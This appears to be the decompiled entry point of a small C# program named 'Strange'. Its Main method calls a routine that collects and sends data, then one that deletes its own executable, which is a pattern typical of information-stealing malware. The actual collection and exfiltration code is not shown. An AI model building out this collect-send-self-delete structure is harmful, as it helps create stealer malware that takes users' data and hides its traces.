using System;
using Strange.Additions;

namespace Strange
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x0000205C File Offset: 0x0000025C
		internal static void Main(string[] args)
		{
			Collect.CollectAndSend();
			Delete.DeleteExe();
		}
	}
}
